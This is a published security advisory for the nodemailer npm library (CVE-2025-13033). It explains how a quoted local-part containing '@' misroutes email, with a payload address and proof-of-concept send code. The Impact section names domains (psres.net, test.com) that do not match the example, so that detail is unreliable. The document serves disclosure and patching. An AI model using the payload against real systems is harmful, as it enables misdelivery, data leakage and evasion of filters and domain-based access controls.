# [M] Nodemailer: Email to an unintended domain can occur due to Interpretation Conflict

## Summary
Severity: Medium
Advisory: GHSA-mm7p-fcc7-pg87
CVE: CVE-2025-13033
CWE: CWE-20, CWE-436
Ecosystem: npm
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N/E:P (CVSS_V4)
Published: 2025-10-07
Source: https://github.com/advisories/GHSA-mm7p-fcc7-pg87
Type: github-advisory

## Affected
- npm: `nodemailer` — affected >=0 <7.0.7

## Details
The email parsing library incorrectly handles quoted local-parts containing @. This leads to misrouting of email recipients, where the parser extracts and routes to an unintended domain instead of the RFC-compliant target.

Payload: `"xclow3n@gmail.com x"@internal.domain`
Using the following code to send mail
```
const nodemailer = require("nodemailer");

let transporter = nodemailer.createTransport({
  service: "gmail",
  auth: {
    user: "",
    pass: "",
  },
});

let mailOptions = {
  from: '"Test Sender" <your_email@gmail.com>', 
  to: "\"xclow3n@gmail.com x\"@internal.domain",
  subject: "Hello from Nodemailer",
  text: "This is a test email sent using Gmail SMTP and Nodemailer!",
};

transporter.sendMail(mailOptions, (error, info) => {
  if (error) {
    return console.log("Error: ", error);
  }
  console.log("Message sent: %s", info.messageId);

});


(async () => {
  const parser = await import("@sparser/email-address-parser");
  const { EmailAddress, ParsingOptions } = parser.default;
  const parsed = EmailAddress.parse(mailOptions.to /*, new ParsingOptions(true) */);

  if (!parsed) {
    console.error("Invalid email address:", mailOptions.to);
    return;
  }

  console.log("Parsed email:", {
    address: `${parsed.localPart}@${parsed.domain}`,
    local: parsed.localPart,
    domain: parsed.domain,
  });
})();
```

Running the script and seeing how this mail is parsed according to RFC

```
Parsed email: {
  address: '"xclow3n@gmail.com x"@internal.domain',
  local: '"xclow3n@gmail.com x"',
  domain: 'internal.domain'
}
```

But the email is sent to `xclow3n@gmail.com`

<img width="2128" height="439" alt="Image" src="https://github.com/user-attachments/assets/20eb459c-9803-45a2-b30e-5d1177d60a8d" />


### Impact:

-    Misdelivery / Data leakage: Email is sent to psres.net instead of test.com.

-    Filter evasion: Logs and anti-spam systems may be bypassed by hiding recipients inside quoted local-parts.

-    Potential compliance issue: Violates RFC 5321/5322 parsing rules.

-    Domain based access control bypass in downstream applications using your library to send mails

### Recommendations

-    Fix parser to correctly treat quoted local-parts per RFC 5321/5322.

-    Add strict validation rejecting local-parts containing embedded @ unless fully compliant with quoting.

## References
- https://github.com/nodemailer/nodemailer/security/advisories/GHSA-mm7p-fcc7-pg87
- https://nvd.nist.gov/vuln/detail/CVE-2025-13033
- https://github.com/nodemailer/nodemailer/commit/1150d99fba77280df2cfb1885c43df23109a8626
- https://access.redhat.com/security/cve/CVE-2025-13033
- https://bugzilla.redhat.com/show_bug.cgi?id=2402179
- https://github.com/nodemailer/nodemailer
